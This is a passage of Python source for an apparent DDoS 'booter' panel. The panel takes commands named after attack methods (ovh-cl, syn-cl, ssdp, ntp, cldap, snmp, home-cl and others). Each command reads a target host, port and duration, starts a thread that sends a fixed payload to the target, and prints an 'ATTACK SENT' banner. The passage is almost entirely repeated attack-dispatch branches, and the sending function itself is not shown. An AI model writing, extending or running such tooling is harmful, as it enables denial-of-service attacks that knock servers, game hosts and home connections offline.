\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main() 
		elif sinput == "ovh-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfobeta-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "mixamp-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "GAME-CL":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ubiquiti-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "home-cl":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ard":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ntp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-mini":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "snmp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cldap":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "home-clap":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "std":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-sbnafu":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
